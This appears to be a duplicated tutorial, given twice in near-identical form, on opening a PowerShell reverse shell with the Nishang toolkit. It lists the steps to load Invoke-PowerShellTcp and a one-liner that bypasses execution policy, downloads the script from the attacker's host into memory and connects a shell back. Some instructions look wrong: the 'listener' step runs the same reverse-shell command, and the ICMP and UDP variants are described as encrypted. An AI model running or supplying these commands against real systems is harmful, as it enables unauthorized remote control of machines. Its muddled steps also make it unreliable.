Open PowerShell as an administrator and navigate to the directory where you extracted Nishang.

Load the "Invoke-PowerShellTcp.ps1" script into your PowerShell session by running:

Import-Module .\Shells\Invoke-PowerShellTcp.ps1
Start a listener to receive the incoming reverse shell by running:

Invoke-PowerShellTcp -Reverse -IPAddress <YOUR_IP_ADDRESS> -Port <YOUR_PORT>
Replace <YOUR_IP_ADDRESS> and <YOUR_PORT> with your own values. 

This command will start a listener on your machine and wait for an incoming connection from the target machine.

On the target machine, run the following command to create the reverse shell:

Invoke-PowerShellTcp -Reverse -IPAddress <YOUR_IP_ADDRESS> -Port <YOUR_PORT>
Replace <YOUR_IP_ADDRESS> and <YOUR_PORT> with the IP address and port of your listener. 
This command will create a PowerShell session on the target machine and connect back to your machine, allowing you to execute commands on the target machine.

Note that this example creates an unencrypted reverse shell. If you need to create an encrypted reverse shell, Nishang also contains scripts for that, such as "Invoke-PowerShellIcmp" and "Invoke-PowerShellUdp". 
Be sure to use Nishang responsibly and only on systems that you have permission to test on.

//
//
//

Here's an example of how to use Nishang to create a PowerShell reverse shell:

Download Nishang from the official GitHub repository: https://github.com/samratashok/nishang

Extract the contents of the downloaded ZIP file to a directory of your choice.

Open PowerShell as an administrator and navigate to the directory where you extracted Nishang.

Load the "Invoke-PowerShellTcp.ps1" script into your PowerShell session by running:

```
Import-Module .\Shells\Invoke-PowerShellTcp.ps1
```

Start a listener to receive the incoming reverse shell by running:
```
Invoke-PowerShellTcp -Reverse -IPAddress <YOUR_IP_ADDRESS> -Port <YOUR_PORT>
```

Replace <YOUR_IP_ADDRESS> and <YOUR_PORT> with your own values. 
This command will start a listener on your machine and wait for an incoming connection from the target machine.

On the target machine, run the following command to create the reverse shell:
```
powershell.exe -ExecutionPolicy Bypass -NoExit -Command "IEX (New-Object Net.WebClient).DownloadString('http://<YOUR_IP_ADDRESS>:<YOUR_PORT>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <YOUR_IP_ADDRESS> -Port <YOUR_PORT>"
Replace <YOUR_IP_ADDRESS> and <YOUR_PORT> with the IP address and port of your listener. 
```
This command will download the "Invoke-PowerShellTcp.ps1" script from your machine, 
load it into memory, and create a reverse shell back to your listener.

Note that this example creates an unencrypted reverse shell. 
If you need to create an encrypted reverse shell, Nishang also contains scripts for that, such as "Invoke-PowerShellIcmp" and "Invoke-PowerShellUdp". 
Be sure to use Nishang responsibly and only on systems that you have permission to test on.

